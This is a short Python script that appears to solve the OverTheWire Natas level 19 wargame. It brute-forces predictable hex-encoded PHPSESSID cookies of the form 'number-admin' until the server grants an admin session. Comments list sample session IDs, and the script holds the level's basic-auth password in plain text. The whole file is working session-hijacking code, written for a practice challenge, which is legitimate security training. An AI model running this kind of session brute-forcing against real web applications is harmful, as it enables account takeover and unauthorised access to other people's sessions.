import requests


#sample PHPSESSID list
#empty username
#38342d - 84-
#3432382d - 428-
#3532302d
#3335312d
#3132342d
#3534362d
#
#username=a
#3435382d61 - 458-a
#
#username=ab
#3132322d6162 - 122-ab

for i in range(0,641):
	seshid=(str(i)+"-admin").encode('hex')
	_jar = dict(PHPSESSID=seshid)
	c = requests.get('http://natas19.natas.labs.overthewire.org/index.php', auth=('natas19','4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'), cookies=_jar)

	if c.text.find("You are an admin.") != -1:
		print "Here's our fella: " + seshid
		break
	else:
		print "Failed on: " + seshid
